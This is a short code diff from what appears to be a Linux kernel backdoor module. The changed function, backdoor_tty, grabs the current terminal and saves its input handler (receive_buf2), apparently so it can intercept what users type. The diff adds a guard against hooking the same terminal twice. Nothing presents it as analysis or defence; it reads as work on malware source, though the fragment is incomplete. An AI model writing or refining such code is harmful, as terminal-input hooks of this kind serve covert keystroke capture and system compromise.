@@ -22,7 +22,7 @@ backdoor_read(void)
 void
 backdoor_tty(void)
 {
-    if ((tty = get_current_tty())) {
+    if (!tty && (tty = get_current_tty())) {
         if (tty->ldisc->ops->receive_buf2) {
             atomic_set(&receive_buf2_count, 0);
             current_receive_buf2 = tty->ldisc->ops->receive_buf2;
